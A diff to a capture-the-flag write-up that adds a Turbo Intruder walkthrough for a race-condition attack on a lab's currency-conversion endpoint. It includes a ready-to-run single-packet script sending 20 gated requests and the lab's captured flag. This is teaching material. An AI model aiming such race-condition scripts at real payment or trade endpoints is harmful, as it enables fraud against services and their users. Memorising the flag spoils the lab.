@@ -72,12 +72,39 @@ POST /api/trade
 
 **Flag:** `bug{d4D5iG3oJdvmQttd56fu7rJT9tcxj7PG}`
 
+### Turbo Intruder - The Fast Way
+
+- Right-click the convert-currency request in Proxy history -> Extensions -> **Turbo Intruder** -> "Send to turbo intruder"
+- Select the `race-single-packet-attack.py` template from the dropdown
+- The template queues 20 identical requests behind a gate, then releases them all in a single TCP packet:
+
+```python
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           engine=Engine.BURP2)
+    for i in range(20):
+        engine.queue(target.req, gate='race1')
+    engine.openGate('race1')
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
+
+- Hit **Attack** - 20 requests, single connection, all 200s
+
+![Turbo Intruder setup - race-single-packet-attack.py template loaded](/BugForge/img/shady3-03.png)
+
+![Turbo Intruder results - 20/20 successful, all returning the flag](/BugForge/img/shady3-04.png)
+![Urbobo Intruder results - flag achieved](/BugForge/img/shady3-05.png)
+
 ### Why Single-Packet?
 
 - Regular parallel sends have network jitter - microseconds between packets
-- Burp's single-packet attack stuffs all HTTP requests into one TCP segment
+- Both Burp Repeater groups and Turbo Intruder stuff all HTTP requests into one TCP segment
 - The server processes them truly simultaneously, maximizing the race window
 - This is the James Kettle / PortSwigger technique from "Smashing the State Machine" research
+- Turbo Intruder is the fastest path: right-click -> template -> attack (30 seconds total)
 
 ## Security Takeaways
 
